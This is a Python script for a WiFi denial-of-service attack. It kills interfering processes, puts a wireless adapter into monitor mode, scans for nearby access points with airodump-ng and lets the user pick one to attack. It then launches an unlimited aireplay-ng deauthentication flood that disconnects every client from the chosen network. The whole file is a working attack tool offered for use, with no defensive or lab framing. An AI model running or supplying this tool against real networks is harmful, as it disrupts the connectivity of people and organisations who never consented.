from asyncio.subprocess import DEVNULL
import subprocess, os, csv, time
from helper import get_NICs, cmd, is_root, delete_csv, reset_nic, ap_present

active_APs = []
nic = None

def setup_nic():
    global nic

    # Get NICs
    NICs = get_NICs()

    if len(NICs) == 0:
        print("[-] Error: No Wifi Adapters found.")
        exit()

    print("The following WiFi adapters were found:")
    for k, v in enumerate(NICs):
        print(f"{k} - {v}")

    # Choose NIC 
    while True:
        if len(NICs) == 1:
            nic_index = 0 
            break
        nic_index = input("Select any of the following NICs: ")
        try:
            if NICs[int(nic_index)]:
                break
        except:
            print("Please enter a number that corresponds with the choices available.")

    nic = NICs[int(nic_index)]

    print(f"Killing intrusive system processes...", end=" ")
    subprocess.run(cmd("sudo airmon-ng check kill"), stdout=DEVNULL)
    print("Done.")

    print(f"Putting {nic} into monitored mode...", end=" ")
    subprocess.run(cmd(f"sudo airmon-ng start {nic}"), stdout=DEVNULL)
    nic += "mon"
    print("Done.\n")

def scan_access_points():
    global active_APs, nic

    subprocess.Popen(cmd(f"sudo airodump-ng -w file --write-interval 1 --output-format csv {nic}"), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    try:
        while True:
            subprocess.call("clear", shell=True)

            fieldnames = ['BSSID', 'First_time_seen', 'Last_time_seen', 'channel', \
                'Speed', 'Privacy', 'Cipher', 'Authentication', \
                'Power', 'beacons', 'IV', 'LAN_IP', 'ID_length', 'ESSID', 'Key']

            csv_files = list(filter(lambda x: '.csv' in x, os.listdir('.')))

            if not csv_files:
                continue
        
            with open(csv_files[0]) as file:
                file.seek(0)

                csv_reader = csv.DictReader(file, fieldnames=fieldnames)
                for row in csv_reader:
                    if row["BSSID"] == "BSSID":
                        continue 

                    if row["BSSID"] == "Station MAC":
                        break

                    if not ap_present(row["ESSID"], active_APs):
                        active_APs.append(row)

            print("Scanning. Press Ctrl+C to stop scanning and choose AP to attack.\n")
            print("No |\tBSSID              |\tChannel|\tESSID                         |")
            print("___|\t___________________|\t_______|\t______________________________|")
            for index, item in enumerate(active_APs):
                print(f"{index}\t{item['BSSID']}\t{item['channel'].strip()}\t\t{item['ESSID']}")
            time.sleep(1)
    except FileExistsError:
        print("[-] Error: CSV file not found.")
        reset_nic(nic)
    except KeyboardInterrupt:
        delete_csv()
    except Exception as e:
        print(f"[-] Error: {e}")
        reset_nic(nic)

def choose_access_point():
    global active_APs
    while True:
        try:
            choice = input("Please select one of the access points above: ")
            if active_APs[int(choice)]:
                AP = active_APs[int(choice)]
                break
        except KeyboardInterrupt:
            reset_nic(nic)
            exit()
        except:
            print("[-] Error: Invalid choice. Please try again.")

    ap_mac = AP["BSSID"]
    ap_channel = AP["channel"].strip()

    return ap_mac, ap_channel

def attack(ap_mac, ap_channel):
    global nic
    subprocess.run(cmd(f"airmon-ng start {nic} {ap_channel}"), stdout=DEVNULL)

    try:
        subprocess.run(cmd(f"aireplay-ng --deauth 0 -a {ap_mac} {nic}"))
    except KeyboardInterrupt:
        reset_nic(nic)
    finally:
        print("Bye!")

if __name__ == '__main__':

    if not is_root:
        print("[-] Error: You need to run as root.")
        exit()

    setup_nic()
    scan_access_points()
    mac, ch = choose_access_point()
    attack(mac, ch)